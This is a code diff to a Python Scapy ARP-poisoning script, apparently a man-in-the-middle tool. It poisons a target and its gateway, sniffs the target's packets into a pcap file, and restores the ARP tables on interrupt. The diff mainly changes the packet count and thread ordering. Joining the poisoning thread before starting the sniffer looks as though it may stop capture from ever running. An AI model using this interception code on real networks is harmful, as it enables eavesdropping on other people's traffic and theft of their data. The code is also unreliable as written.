@@ -10,7 +10,7 @@ except IndexError:
     sys.exit(1)
 
 
-packet_count = 1000
+packet_count = 20
 conf.iface = interface
 
 
@@ -67,6 +67,7 @@ def start_sniffing(interface, gateway_ip, gateway_mac, target_ip,target_mac, fil
         try:
             packets = sniff(filter=filter, count=packet_count,iface=interface, prn = lambda x: x.show())
             wrpcap('arper.pcap',packets)
+            return
         except KeyboardInterrupt:
             #restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
             return
@@ -74,6 +75,7 @@ def start_sniffing(interface, gateway_ip, gateway_mac, target_ip,target_mac, fil
         try:
             packets = sniff(filter="ip host %s" % target_ip, count=packet_count,iface=interface, prn = lambda x: x.show())
             wrpcap('arper.pcap',packets)
+            return
         except KeyboardInterrupt:
             #restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
             return
@@ -116,19 +118,22 @@ try:
     print("[*] Target %s is at %s" % (target_ip,target_mac))
     print("[*] Gateway %s is at %s" % (gateway_ip,gateway_mac))
     # start poison thread
+    
     re = threading.Event()
     re.set()
 
     poison_thread = threading.Thread(target = poison_target, args = (gateway_ip, gateway_mac,target_ip,target_mac, re))
-    sniff_thread = threading.Thread(target = start_sniffing, args = (interface, gateway_ip,gateway_mac,target_ip,target_mac))
-
     poison_thread.deamon = True
     poison_thread.start()
+    poison_thread.join()
+
+    sniff_thread = threading.Thread(target = start_sniffing, args = (interface, gateway_ip,gateway_mac,target_ip,target_mac))
     sniff_thread.deamon = True
     sniff_thread.start()
+    sniff_thread.join()
+
 except KeyboardInterrupt:
     restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
-
-print("[*] Done")
-poison_thread.stop()
-sniff_thread.stop()
+    print("[*] Done")
+    #poison_thread.stop()
+    #sniff_thread.stop()
